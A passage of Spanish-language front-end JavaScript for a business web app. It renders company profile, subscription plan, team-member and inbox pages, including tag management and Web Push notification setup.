                ${icon('alert-triangle',16)} El numero WA del bot no esta configurado en Admin &rarr; Integraciones &rarr; Conversation Hub. Sin eso, no podemos armar el link de confirmacion por WhatsApp.
            </div>
        `;

    showModal(`Pedido ${ref} creado`, `
        <div style="text-align:center;padding:10px 0 20px">
            <div style="font-size:48px;color:#16a34a;margin-bottom:10px">✓</div>
            ${waBlock}
        </div>
        <div style="text-align:right;border-top:1px solid var(--gray-200);padding-top:12px">
            <button class="btn btn-secondary" onclick="closeModal();navigate('pedidos')">Ver cotizaciones</button>
        </div>
    `);
}

// ── Company page ─────────────────────────────────────────────
async function renderCompany() {
    const page = document.getElementById('page-content');
    page.innerHTML = '<div class="empty-state"><p>Cargando...</p></div>';

    const resp = await API.myCompany();
    if (!resp.ok) { page.innerHTML = '<div class="empty-state"><p>Error cargando datos</p></div>'; return; }

    if (!resp.data) {
        // No company yet — show create CTA
        renderCreateCompanyCTA(page);
        return;
    }

    const c = resp.data;
    const sub = c.subscription;
    const isAdmin = c.my_role === 'company_admin';
    const planColors = { free: '#6b7280', professional: '#2563eb', enterprise: '#d97706' };

    page.innerHTML = `
        <div class="page-header" style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px">
            <div>
                <h1 class="page-title">${esc(c.name)}</h1>
                <p class="page-subtitle">${c.nit ? 'NIT: ' + esc(c.nit) + ' &middot; ' : ''}${c.city ? esc(c.city) : ''}${c.department ? ', ' + esc(c.department) : ''}</p>
            </div>
            ${isAdmin ? `<button class="btn btn-secondary" onclick="showEditCompanyModal(${c.id})">${icon('settings',16)} Editar</button>` : ''}
        </div>

        <div class="company-grid">
            <!-- Subscription card -->
            <div class="company-card">
                <div class="company-card-header">
                    <span>${icon('crown',18)} Suscripcion</span>
                    <span class="pedido-state" style="background:${planColors[sub?.plan] || '#6b7280'}">${sub ? esc(sub.plan_label) : 'Sin plan'}</span>
                </div>
                <div class="company-card-body">
                    ${sub ? `
                        <div class="sub-info-row"><span>Estado</span><span class="sub-state-${sub.state}">${esc(sub.state === 'active' ? 'Activo' : sub.state)}</span></div>
                        <div class="sub-info-row"><span>Usuarios</span><span>${c.member_count} / ${sub.max_users}</span></div>
                        <div class="sub-info-row"><span>Pedidos/mes</span><span>${sub.max_pedidos_month === 999 ? 'Ilimitados' : sub.max_pedidos_month}</span></div>
                        ${sub.expires_at ? `<div class="sub-info-row"><span>Vence</span><span>${new Date(sub.expires_at).toLocaleDateString()}</span></div>` : ''}
                        ${sub.last_payment_date ? `<div class="sub-info-row"><span>Ultimo pago</span><span>${new Date(sub.last_payment_date).toLocaleDateString()} - ${sub.last_payment_amount?.toFixed(2) || ''} BOB</span></div>` : ''}
                    ` : '<p style="color:var(--gray-500)">Sin suscripcion activa</p>'}
                    ${isAdmin && sub?.plan !== 'enterprise' ? `<button class="btn btn-primary btn-sm" style="margin-top:12px" onclick="showUpgradeModal()">Mejorar Plan</button>` : ''}
                </div>
            </div>

            <!-- Company info card -->
            <div class="company-card">
                <div class="company-card-header">
                    <span>${icon('building',18)} Datos de la Empresa</span>
                </div>
                <div class="company-card-body">
                    ${c.industry ? `<div class="sub-info-row"><span>Rubro</span><span>${esc(c.industry)}</span></div>` : ''}
                    ${c.phone ? `<div class="sub-info-row"><span>Telefono</span><span>${esc(c.phone)}</span></div>` : ''}
                    ${c.email ? `<div class="sub-info-row"><span>Email</span><span>${esc(c.email)}</span></div>` : ''}
                    ${c.website ? `<div class="sub-info-row"><span>Web</span><span>${esc(c.website)}</span></div>` : ''}
                    ${c.address ? `<div class="sub-info-row"><span>Direccion</span><span>${esc(c.address)}</span></div>` : ''}
                    <div class="sub-info-row"><span>Tu rol</span><span class="member-role role-${c.my_role}">${c.my_role === 'company_admin' ? 'Admin' : c.my_role === 'cotizador' ? 'Cotizador' : 'Viewer'}</span></div>
                </div>
            </div>
        </div>

        <!-- Team section -->
        <div class="company-section">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
                <h3>${icon('users',18)} Equipo (${c.member_count})</h3>
                ${isAdmin ? `<button class="btn btn-primary btn-sm" onclick="showAddMemberModal(${c.id})">${icon('user-plus',16)} Agregar</button>` : ''}
            </div>
            <div id="company-members-list"><div class="empty-state"><p>Cargando...</p></div></div>
        </div>

        ${isAdmin ? '<div id="company-ai-section"></div>' : ''}
    `;

    loadCompanyMembers(c.id, isAdmin);
    if (isAdmin) renderCompanyAIConfig(c.id);
}

function renderCreateCompanyCTA(page) {
    page.innerHTML = `
        <div class="page-header">
            <h1 class="page-title">Mi Empresa</h1>
            <p class="page-subtitle">Crea tu empresa para trabajar en equipo y gestionar cotizaciones</p>
        </div>
        <div class="company-cta">
            <div class="company-cta-content">
                <h2>Trabaja en equipo</h2>
                <p>Registra tu empresa para invitar cotizadores, asignar pedidos y gestionar suscripciones.</p>
                <div class="company-cta-features">
                    <div class="cta-feature">${icon('users',20)} <span>Equipo de cotizadores</span></div>
                    <div class="cta-feature">${icon('clipboard',20)} <span>Asignacion de pedidos</span></div>
                    <div class="cta-feature">${icon('star',20)} <span>Plan gratuito para empezar</span></div>
                </div>
                <button class="btn btn-primary btn-lg" onclick="showCreateCompanyModal()" style="margin-top:20px">Crear Empresa</button>
            </div>
            <div class="company-plans" id="plans-container"></div>
        </div>
    `;
    loadPlans();
}

async function loadPlans() {
    const container = document.getElementById('plans-container');
    if (!container) return;
    try {
        const resp = await API.plans();
        if (!resp.ok || !resp.data.length) return;
        container.innerHTML = resp.data.map(p => `
            <div class="plan-card ${p.key === 'professional' ? 'plan-featured' : ''}">
                <div class="plan-name">${esc(p.label)}</div>
                <div class="plan-price">${p.price_bob > 0 ? p.price_bob + ' <span>BOB/mes</span>' : 'Gratis'}</div>
                <ul class="plan-features">
                    ${p.features.map(f => `<li>${esc(f)}</li>`).join('')}
                </ul>
            </div>
        `).join('');
    } catch {}
}

function showCreateCompanyModal() {
    showModal('Crear Empresa', `
        <form onsubmit="handleCreateCompany(event)">
            <div class="form-group">
                <label class="form-label">Nombre de la empresa *</label>
                <input class="form-input" name="name" required placeholder="Constructora XYZ S.R.L.">
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">NIT</label>
                    <input class="form-input" name="nit" placeholder="1234567890">
                </div>
                <div class="form-group">
                    <label class="form-label">Rubro</label>
                    <input class="form-input" name="industry" placeholder="Construccion">
                </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Ciudad</label>
                    <input class="form-input" name="city" placeholder="Santa Cruz">
                </div>
                <div class="form-group">
                    <label class="form-label">Departamento</label>
                    <select class="form-input" name="department">
                        <option value="">Seleccionar...</option>
                        ${DEPARTMENTS.map(d => `<option value="${d}">${d}</option>`).join('')}
                    </select>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Telefono</label>
                <input class="form-input" name="phone" placeholder="+591 ...">
            </div>
            <div class="form-group">
                <label class="form-label">Email corporativo</label>
                <input class="form-input" name="email" type="email" placeholder="info@empresa.com">
            </div>
            <p style="font-size:12px;color:var(--gray-500);margin:8px 0">Se creara con el plan Gratuito. Podras mejorarlo despues.</p>
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">Crear Empresa</button>
            </div>
        </form>
    `);
}

async function handleCreateCompany(e) {
    e.preventDefault();
    const f = e.target;
    const resp = await API.createCompany({
        name: f.name.value,
        nit: f.nit.value || null,
        industry: f.industry.value || null,
        city: f.city.value || null,
        department: f.department.value || null,
        phone: f.phone.value || null,
        email: f.email.value || null,
    });
    if (resp.ok) {
        // Update local user state
        state.user.company_id = resp.data.id;
        state.user.company_role = 'company_admin';
        localStorage.setItem('_mkt_user', JSON.stringify(state.user));
        closeModal();
        toast('Empresa creada exitosamente', 'success');
        renderApp();
    } else {
        toast(resp.detail || 'Error creando empresa', 'error');
    }
}

async function showEditCompanyModal(companyId) {
    const resp = await API.myCompany();
    if (!resp.ok || !resp.data) return;
    const c = resp.data;

    showModal('Editar Empresa', `
        <form onsubmit="handleEditCompany(event, ${companyId})">
            <div class="form-group">
                <label class="form-label">Nombre *</label>
                <input class="form-input" name="name" required value="${esc(c.name)}">
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">NIT</label>
                    <input class="form-input" name="nit" value="${esc(c.nit || '')}">
                </div>
                <div class="form-group">
                    <label class="form-label">Rubro</label>
                    <input class="form-input" name="industry" value="${esc(c.industry || '')}">
                </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Ciudad</label>
                    <input class="form-input" name="city" value="${esc(c.city || '')}">
                </div>
                <div class="form-group">
                    <label class="form-label">Departamento</label>
                    <select class="form-input" name="department">
                        <option value="">Seleccionar...</option>
                        ${DEPARTMENTS.map(d => `<option value="${d}" ${c.department === d ? 'selected' : ''}>${d}</option>`).join('')}
                    </select>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Telefono</label>
                <input class="form-input" name="phone" value="${esc(c.phone || '')}">
            </div>
            <div class="form-group">
                <label class="form-label">Email</label>
                <input class="form-input" name="email" type="email" value="${esc(c.email || '')}">
            </div>
            <div class="form-group">
                <label class="form-label">Sitio web</label>
                <input class="form-input" name="website" value="${esc(c.website || '')}">
            </div>
            <div class="form-group">
                <label class="form-label">Direccion</label>
                <textarea class="form-input" name="address" rows="2">${esc(c.address || '')}</textarea>
            </div>
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">Guardar</button>
            </div>
        </form>
    `);
}

async function handleEditCompany(e, companyId) {
    e.preventDefault();
    const f = e.target;
    const resp = await API.updateCompany(companyId, {
        name: f.name.value,
        nit: f.nit.value || null,
        industry: f.industry.value || null,
        city: f.city.value || null,
        department: f.department.value || null,
        phone: f.phone.value || null,
        email: f.email.value || null,
        website: f.website.value || null,
        address: f.address.value || null,
    });
    if (resp.ok) {
        closeModal();
        toast('Empresa actualizada', 'success');
        renderCompany();
    } else toast(resp.detail || 'Error', 'error');
}

async function loadCompanyMembers(companyId, isAdmin) {
    const container = document.getElementById('company-members-list');
    if (!container) return;
    try {
        const resp = await API.companyMembers(companyId);
        if (!resp.ok) { container.innerHTML = '<p style="color:var(--gray-500)">Error cargando equipo</p>'; return; }
        if (!resp.data.length) { container.innerHTML = '<p style="color:var(--gray-500)">Sin miembros</p>'; return; }

        const roleLabels = { company_admin: 'Admin', cotizador: 'Cotizador', viewer: 'Viewer' };
        container.innerHTML = `
            <div class="members-table">
                ${resp.data.map(m => `
                    <div class="member-row">
                        <div class="member-info">
                            <div class="member-name">${esc(m.full_name)}</div>
                            <div class="member-email">${esc(m.email)}</div>
                        </div>
                        <div class="member-actions">
                            <span class="member-role role-${m.company_role}">${roleLabels[m.company_role] || m.company_role}</span>
                            ${isAdmin && m.id !== state.user.id ? `
                                <select class="form-input member-role-select" onchange="changeMemberRole(${companyId},${m.id},this.value)">
                                    <option value="company_admin" ${m.company_role === 'company_admin' ? 'selected' : ''}>Admin</option>
                                    <option value="cotizador" ${m.company_role === 'cotizador' ? 'selected' : ''}>Cotizador</option>
                                    <option value="viewer" ${m.company_role === 'viewer' ? 'selected' : ''}>Viewer</option>
                                </select>
                                <button class="btn btn-sm btn-danger" onclick="removeMemberConfirm(${companyId},${m.id},'${escJs(m.full_name)}')">&times;</button>
                            ` : ''}
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    } catch { container.innerHTML = '<p style="color:var(--gray-500)">Error de conexion</p>'; }
}

function showAddMemberModal(companyId) {
    showModal('Agregar Miembro', `
        <form onsubmit="handleAddMember(event, ${companyId})">
            <div class="form-group">
                <label class="form-label">Email del usuario *</label>
                <input class="form-input" name="email" type="email" required placeholder="usuario@email.com">
                <p style="font-size:12px;color:var(--gray-500);margin-top:4px">El usuario debe estar registrado en la plataforma</p>
            </div>
            <div class="form-group">
                <label class="form-label">Rol</label>
                <select class="form-input" name="company_role">
                    <option value="cotizador">Cotizador</option>
                    <option value="viewer">Viewer (solo lectura)</option>
                    <option value="company_admin">Administrador</option>
                </select>
            </div>
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">Agregar</button>
            </div>
        </form>
    `);
}

async function handleAddMember(e, companyId) {
    e.preventDefault();
    const f = e.target;
    const resp = await API.addMember(companyId, {
        email: f.email.value,
        company_role: f.company_role.value,
    });
    if (resp.ok) {
        closeModal();
        toast('Miembro agregado', 'success');
        renderCompany();
    } else toast(resp.detail || 'Error', 'error');
}

async function changeMemberRole(companyId, userId, newRole) {
    const resp = await API.updateMember(companyId, userId, { company_role: newRole });
    if (resp.ok) toast('Rol actualizado', 'success');
    else toast(resp.detail || 'Error', 'error');
}

async function removeMemberConfirm(companyId, userId, name) {
    if (!confirm(`Remover a ${name} de la empresa?`)) return;
    const resp = await API.removeMember(companyId, userId);
    if (resp.ok) {
        toast('Miembro removido', 'success');
        renderCompany();
    } else toast(resp.detail || 'Error', 'error');
}

async function showUpgradeModal() {
    let plansHtml = '<div class="empty-state"><p>Cargando planes...</p></div>';
    try {
        const resp = await API.plans();
        if (resp.ok) {
            plansHtml = resp.data.filter(p => p.key !== 'free').map(p => `
                <div class="plan-card-modal">
                    <div class="plan-name">${esc(p.label)}</div>
                    <div class="plan-price">${p.price_bob} <span>BOB/mes</span></div>
                    <ul class="plan-features">${p.features.map(f => `<li>${esc(f)}</li>`).join('')}</ul>
                    <button class="btn btn-primary btn-sm" style="width:100%;margin-top:8px" onclick="requestUpgrade('${p.key}')">Solicitar ${esc(p.label)}</button>
                </div>
            `).join('');
        }
    } catch {}

    showModal('Mejorar Plan', `
        <p style="color:var(--gray-500);margin-bottom:16px">Selecciona un plan. Un administrador se pondra en contacto para el proceso de pago.</p>
        <div class="plans-modal-grid">${plansHtml}</div>
    `);
}

async function requestUpgrade(planKey) {
    const resp = await API.requestUpgrade({ plan: planKey });
    if (resp.ok) {
        closeModal();
        toast(resp.message || 'Solicitud enviada', 'success');
    } else toast(resp.detail || 'Error', 'error');
}

// ── Inbox page (Fase 2 — Hito A) ─────────────────────────────
const _inbox = {
    sessions: [],
    selectedId: null,
    filter: 'open',
    assignedFilter: '',
    search: '',
    unreadOnly: false,
    unreadCount: 0,
    pollTimer: null,
    searchDebounce: null,
    operators: null,  // cache lazy
    // 5.5: Web Notifications
    notifLastSeenIds: null,   // Set<number> de session ids con unread en ultimo poll
    notifEnabled: (typeof localStorage !== 'undefined' && localStorage.getItem('inboxNotifEnabled') === '1'),
    notifInit: false,         // primer poll: solo baseline, no notificar
    // 5.11: WebSocket live updates
    ws: null,
    wsStatus: 'off',          // 'off' | 'connecting' | 'open'
    wsBackoffMs: 1000,        // exponencial hasta 30s
    wsReconnectTimer: null,
    // 5.12: Tags / etiquetas manuales
    tagCatalog: [],           // [{id, name, color, usage_count}]
    tagCatalogLoaded: false,
    tagFilter: [],            // array de tag ids seleccionados
    tagPopoverSessionId: null,
};

// Paleta fija de 8 colores (debe coincidir con TAG_COLOR_SLUGS del backend).
const _INBOX_TAG_PALETTE = [
    { slug: 'slate',  bg: '#e2e8f0', fg: '#334155' },
    { slug: 'blue',   bg: '#dbeafe', fg: '#1e40af' },
    { slug: 'green',  bg: '#dcfce7', fg: '#166534' },
    { slug: 'yellow', bg: '#fef9c3', fg: '#854d0e' },
    { slug: 'red',    bg: '#fee2e2', fg: '#991b1b' },
    { slug: 'purple', bg: '#ede9fe', fg: '#5b21b6' },
    { slug: 'pink',   bg: '#fce7f3', fg: '#9d174d' },
    { slug: 'orange', bg: '#ffedd5', fg: '#9a3412' },
];

function _inboxTagColor(slug) {
    return _INBOX_TAG_PALETTE.find(c => c.slug === slug) || _INBOX_TAG_PALETTE[0];
}

function _inboxTagBadge(tag, opts = {}) {
    const { bg, fg } = _inboxTagColor(tag.color);
    const name = esc(tag.name || '');
    const removable = !!opts.removable;
    const sid = opts.sessionId;
    const x = removable
        ? `<span class="inbox-tag-x" onclick="event.stopPropagation();unassignInboxTag(${sid},${tag.id})" title="Quitar">&times;</span>`
        : '';
    return `<span class="inbox-tag" style="background:${bg};color:${fg}">${name}${x}</span>`;
}

async function _inboxLoadTagCatalog({ force = false } = {}) {
    if (_inbox.tagCatalogLoaded && !force) return _inbox.tagCatalog;
    try {
        const resp = await API.inboxTags();
        if (resp && resp.ok) {
            _inbox.tagCatalog = resp.data || [];
            _inbox.tagCatalogLoaded = true;
        }
    } catch (_) { /* silent */ }
    return _inbox.tagCatalog;
}

function _inboxRenderItemTags(tags) {
    if (!tags || !tags.length) return '';
    const visible = tags.slice(0, 3);
    const overflow = tags.length - visible.length;
    let html = visible.map(t => _inboxTagBadge(t)).join('');
    if (overflow > 0) {
        html += `<span class="inbox-tag" style="background:#f3f4f6;color:#374151">+${overflow}</span>`;
    }
    return html;
}

function _inboxRenderTagFilterBar() {
    if (!_inbox.tagCatalog.length) return '';
    const chips = _inbox.tagCatalog.map(t => {
        const active = _inbox.tagFilter.includes(t.id);
        const { bg, fg } = _inboxTagColor(t.color);
        const style = active
            ? `background:${fg};color:#fff;border:1px solid ${fg}`
            : `background:${bg};color:${fg};border:1px solid transparent`;
        const count = t.usage_count != null ? ` <small>(${t.usage_count})</small>` : '';
        return `<span class="inbox-tag" style="${style};cursor:pointer" onclick="toggleInboxTagFilter(${t.id})">${esc(t.name)}${count}</span>`;
    }).join('');
    const clear = _inbox.tagFilter.length
        ? `<button class="btn btn-secondary btn-sm" style="padding:2px 6px;font-size:11px" onclick="clearInboxTagFilter()">Limpiar</button>`
        : '';
    return `<div class="inbox-tag-filter-bar">${chips}${clear}</div>`;
}

function toggleInboxTagFilter(tagId) {
    const idx = _inbox.tagFilter.indexOf(tagId);
    if (idx >= 0) _inbox.tagFilter.splice(idx, 1);
    else _inbox.tagFilter.push(tagId);
    _inboxUpdateTagFilterBar();
    loadInboxSessions();
}

function clearInboxTagFilter() {
    _inbox.tagFilter = [];
    _inboxUpdateTagFilterBar();
    loadInboxSessions();
}

function _inboxUpdateTagFilterBar() {
    const host = document.getElementById('inbox-tag-filter-host');
    if (host) host.innerHTML = _inboxRenderTagFilterBar();
}

function _inboxRenderDetailTags(s) {
    const manager = isManager();
    const tags = s.tags || [];
    const chips = tags.map(t => _inboxTagBadge(t, { removable: manager, sessionId: s.id })).join('');
    const addBtn = manager
        ? `<button class="btn btn-secondary btn-sm" style="padding:2px 8px;font-size:11px" onclick="openInboxTagPopover(${s.id}, event)">+ Tag</button>`
        : '';
    if (!chips && !addBtn) return '';
    return `<div class="inbox-tags-line">${chips}${addBtn}</div>`;
}

function openInboxTagPopover(sessionId, ev) {
    if (ev && ev.stopPropagation) ev.stopPropagation();
    closeInboxTagPopover();
    _inbox.tagPopoverSessionId = sessionId;
    const existing = ((_inbox.sessions.find(s => s.id === sessionId) || {}).tags) || [];
    const existingIds = new Set(existing.map(t => t.id));
    const pop = document.createElement('div');
    pop.className = 'inbox-tag-popover';
    pop.id = 'inbox-tag-popover';
    pop.onclick = (e) => e.stopPropagation();
    pop.innerHTML = `
        <div style="font-weight:600;font-size:12px;margin-bottom:6px">Asignar etiqueta</div>
        <input id="inbox-tag-input" type="text" class="form-input" placeholder="Buscar o crear..." style="width:100%;margin-bottom:6px" oninput="_inboxTagPopoverFilter()">
        <div id="inbox-tag-suggestions" style="max-height:180px;overflow-y:auto;margin-bottom:6px"></div>
        <div id="inbox-tag-create-section" style="display:none;border-top:1px solid var(--gray-200);padding-top:6px">
            <div style="font-size:11px;color:#6b7280;margin-bottom:4px">Crear nueva:</div>
            <div class="inbox-tag-popover-row" id="inbox-tag-color-row"></div>
            <button class="btn btn-primary btn-sm" onclick="_inboxTagPopoverCreate()" style="width:100%">Crear y asignar</button>
        </div>
    `;
    // Posicion: ancla debajo del boton clickeado
    const anchor = ev && ev.currentTarget ? ev.currentTarget : null;
    if (anchor) {
        const rect = anchor.getBoundingClientRect();
        pop.style.top = `${rect.bottom + window.scrollY + 4}px`;
        pop.style.left = `${rect.left + window.scrollX}px`;
    } else {
        pop.style.top = '120px';
        pop.style.left = '120px';
    }
    document.body.appendChild(pop);
    // Color swatches
    _inbox._tagPopoverColor = 'slate';
    const colorHost = document.getElementById('inbox-tag-color-row');
    colorHost.innerHTML = _INBOX_TAG_PALETTE.map(c => `
        <span class="inbox-tag-color-swatch ${c.slug === 'slate' ? 'selected' : ''}"
              data-slug="${c.slug}" style="background:${c.bg}"
              onclick="_inboxTagPopoverSelectColor('${c.slug}')"></span>
    `).join('');
    _inboxTagPopoverFilter();
    setTimeout(() => {
        const inp = document.getElementById('inbox-tag-input');
        if (inp) inp.focus();
    }, 10);
    setTimeout(() => document.addEventListener('click', _inboxTagPopoverOutsideClick, { once: true }), 10);
    // Asegurar catalogo cargado (defensivo si el operador entro por deep-link)
    _inboxLoadTagCatalog().then(() => _inboxTagPopoverFilter());
    _inbox._tagPopoverExistingIds = existingIds;
}

function _inboxTagPopoverOutsideClick(e) {
    const pop = document.getElementById('inbox-tag-popover');
    if (pop && !pop.contains(e.target)) closeInboxTagPopover();
    else setTimeout(() => document.addEventListener('click', _inboxTagPopoverOutsideClick, { once: true }), 10);
}

function closeInboxTagPopover() {
    const pop = document.getElementById('inbox-tag-popover');
    if (pop) pop.remove();
    _inbox.tagPopoverSessionId = null;
}

function _inboxTagPopoverSelectColor(slug) {
    _inbox._tagPopoverColor = slug;
    document.querySelectorAll('.inbox-tag-color-swatch').forEach(el => {
        el.classList.toggle('selected', el.getAttribute('data-slug') === slug);
    });
}

function _inboxTagPopoverFilter() {
    const inp = document.getElementById('inbox-tag-input');
    const q = (inp ? inp.value : '').trim().toLowerCase();
    const existingIds = _inbox._tagPopoverExistingIds || new Set();
    const matches = _inbox.tagCatalog.filter(t => !existingIds.has(t.id) && (!q || t.name.toLowerCase().includes(q)));
    const exact = q && _inbox.tagCatalog.some(t => t.name.toLowerCase() === q);
    const host = document.getElementById('inbox-tag-suggestions');
    if (host) {
        if (matches.length) {
            host.innerHTML = matches.slice(0, 20).map(t => `
                <div class="inbox-tag-suggestion" onclick="_inboxTagPopoverAssign(${t.id})">
                    ${_inboxTagBadge(t)}
                </div>
            `).join('');
        } else {
            host.innerHTML = `<div style="padding:4px 8px;color:#6b7280;font-size:12px">${q ? 'Sin coincidencias' : 'Escribe para buscar o crear'}</div>`;
        }
    }
    const createSection = document.getElementById('inbox-tag-create-section');
    if (createSection) {
        createSection.style.display = (q && !exact) ? 'block' : 'none';
    }
}

async function _inboxTagPopoverAssign(tagId) {
    const sid = _inbox.tagPopoverSessionId;
    if (!sid) return;
    const resp = await API.inboxSessionTagAdd(sid, { tag_id: tagId });
    if (resp && resp.ok) {
        closeInboxTagPopover();
        loadInboxSession(sid, { silent: true });
        loadInboxSessions({ silent: true });
        _inboxLoadTagCatalog({ force: true }).then(() => _inboxUpdateTagFilterBar());
    } else {
        toast((resp && resp.error) || 'Error asignando etiqueta', 'error');
    }
}

async function _inboxTagPopoverCreate() {
    const sid = _inbox.tagPopoverSessionId;
    if (!sid) return;
    const inp = document.getElementById('inbox-tag-input');
    const name = inp ? inp.value.trim() : '';
    if (!name) return;
    const color = _inbox._tagPopoverColor || 'slate';
    const resp = await API.inboxSessionTagAdd(sid, { name, color });
    if (resp && resp.ok) {
        closeInboxTagPopover();
        loadInboxSession(sid, { silent: true });
        loadInboxSessions({ silent: true });
        _inboxLoadTagCatalog({ force: true }).then(() => _inboxUpdateTagFilterBar());
    } else {
        toast((resp && resp.error) || 'Error creando etiqueta', 'error');
    }
}

async function unassignInboxTag(sessionId, tagId) {
    const resp = await API.inboxSessionTagRemove(sessionId, tagId);
    if (resp && resp.ok) {
        loadInboxSession(sessionId, { silent: true });
        loadInboxSessions({ silent: true });
        _inboxLoadTagCatalog({ force: true }).then(() => _inboxUpdateTagFilterBar());
    } else {
        toast((resp && resp.error) || 'Error quitando etiqueta', 'error');
    }
}

function _inboxNotifSupported() {
    return typeof window !== 'undefined' && 'Notification' in window;
}

function _urlBase64ToUint8Array(base64String) {
    const padding = '='.repeat((4 - base64String.length % 4) % 4);
    const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
    const raw = atob(base64);
    const out = new Uint8Array(raw.length);
    for (let i = 0; i < raw.length; ++i) out[i] = raw.charCodeAt(i);
    return out;
}

async function _inboxRegisterWebPush() {
    // Intenta registrar una suscripcion Web Push VAPID. Devuelve
    // 'subscribed' | 'local' | 'unsupported'.
    if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
        return 'unsupported';
    }
    let resp;
    try {
        resp = await API.get('/inbox/push/vapid-public-key');
    } catch (_) {
        return 'local';
    }
    if (!resp || !resp.enabled || !resp.public_key) {
        return 'local';
    }
    try {
        const reg = await navigator.serviceWorker.register('/assets/inbox-sw.js');
        await navigator.serviceWorker.ready;
        let sub = await reg.pushManager.getSubscription();
        if (!sub) {
            sub = await reg.pushManager.subscribe({
                userVisibleOnly: true,
                applicationServerKey: _urlBase64ToUint8Array(resp.public_key),
            });
        }
        const json = sub.toJSON();
        await API.post('/inbox/push/subscribe', {
            endpoint: json.endpoint,
            keys: json.keys,
            user_agent: navigator.userAgent.slice(0, 500),
        });
        try { localStorage.setItem('inboxPushEndpoint', json.endpoint); } catch (_) {}
        return 'subscribed';
    } catch (e) {
        console.warn('[inbox] web push subscribe failed', e);
        return 'local';
    }
}

async function _inboxUnregisterWebPush() {
    try {
        if (!('serviceWorker' in navigator)) return;
        const reg = await navigator.serviceWorker.getRegistration('/assets/inbox-sw.js');
        if (!reg) return;
        const sub = await reg.pushManager.getSubscription();
        if (!sub) return;
        const endpoint = sub.endpoint;
        try { await sub.unsubscribe(); } catch (_) {}
        try { await API.post('/inbox/push/unsubscribe', { endpoint }); } catch (_) {}
        try { localStorage.removeItem('inboxPushEndpoint'); } catch (_) {}
    } catch (e) {
        console.warn('[inbox] unsubscribe failed', e);
    }
}

async function toggleInboxNotifications() {
    if (!_inboxNotifSupported()) {
        toast('Tu navegador no soporta notificaciones', 'error');
        return;
    }
    if (_inbox.notifEnabled) {
        _inbox.notifEnabled = false;
        try { localStorage.setItem('inboxNotifEnabled', '0'); } catch (_) {}
        await _inboxUnregisterWebPush();
        toast('Notificaciones desactivadas', 'info');
        _inboxUpdateNotifButton();
        return;
    }
    let perm = Notification.permission;
    if (perm === 'default') {
        try { perm = await Notification.requestPermission(); } catch (_) { perm = 'denied'; }
    }
    if (perm !== 'granted') {
        toast('Permiso de notificacion denegado', 'error');
        return;
    }
    _inbox.notifEnabled = true;
    try { localStorage.setItem('inboxNotifEnabled', '1'); } catch (_) {}
    const mode = await _inboxRegisterWebPush();
    _inbox.notifMode = mode;
    if (mode === 'subscribed') {
        toast('Web Push activado (con VAPID)', 'success');
    } else if (mode === 'unsupported') {
        toast('Notificaciones activadas (sin Service Worker)', 'info');
    } else {
        toast('Notificaciones activadas (modo local)', 'success');
    }
    _inboxUpdateNotifButton();
}

// Listener para mensajes del Service Worker (click en notificacion Web Push)
if (typeof navigator !== 'undefined' && 'serviceWorker' in navigator) {
    try {
        navigator.serviceWorker.addEventListener('message', (ev) => {
            const d = ev && ev.data;
            if (!d || d.type !== 'inbox-open-session') return;
            const sid = d.session_id;
            try { window.focus(); } catch (_) {}
            if (state.currentPage !== 'inbox' && typeof go === 'function') {
                try { go('inbox'); } catch (_) {}
            }
            if (sid && typeof selectInboxSession === 'function') {
                try { selectInboxSession(sid); } catch (_) {}
            }
        });
    } catch (_) {}
}

async function testInboxNotification() {
    try {
        const r = await API.post('/inbox/push/test', {});
        if (r && r.delivered > 0) {
            toast(`Push enviado (${r.delivered} dispositivos)`, 'success');
        } else {
            toast('No hay suscripciones activas (usa el modo local con la pestana abierta)', 'info');
        }
    } catch (e) {
        toast('No se pudo enviar la prueba', 'error');
    }
}

function _inboxUpdateNotifButton() {
    const btn = document.getElementById('inbox-notif-btn');
    if (!btn) return;
    const enabled = _inbox.notifEnabled && _inboxNotifSupported() &&
        (typeof Notification === 'undefined' || Notification.permission === 'granted');
    btn.textContent = enabled ? 'Notif: on' : 'Notif: off';
    btn.classList.toggle('btn-primary', enabled);
    btn.classList.toggle('btn-secondary', !enabled);
}

function _inboxMaybeNotify(sessionsPayload) {
    // Extrae ids de sesiones unread
    const currentUnreadIds = new Set(
        (sessionsPayload || []).filter(s => s.unread).map(s => s.id)
    );
    // Primer poll: solo baseline
    if (!_inbox.notifInit) {
        _inbox.notifLastSeenIds = currentUnreadIds;
        _inbox.notifInit = true;
        return;
    }
    // Si el usuario desactivo o no tiene permiso, saltamos (pero actualizamos baseline)
    const enabled = _inbox.notifEnabled && _inboxNotifSupported() &&
        (typeof Notification !== 'undefined' && Notification.permission === 'granted');
    if (!enabled) {
        _inbox.notifLastSeenIds = currentUnreadIds;
        return;
    }
    // Sesiones con unread nuevas respecto al poll anterior
    const prev = _inbox.notifLastSeenIds || new Set();
    const newOnes = [];
    (sessionsPayload || []).forEach(s => {
        if (s.unread && !prev.has(s.id)) newOnes.push(s);
    });
    _inbox.notifLastSeenIds = currentUnreadIds;
    // No notificar si la pestana esta visible y la sesion ya esta abierta
    const docVisible = (typeof document !== 'undefined' && document.visibilityState === 'visible');
    newOnes.forEach(s => {
        if (docVisible && _inbox.selectedId === s.id) return;
        try {
            const title = s.client_name || s.client_phone || `Pedido #${s.pedido_id}`;
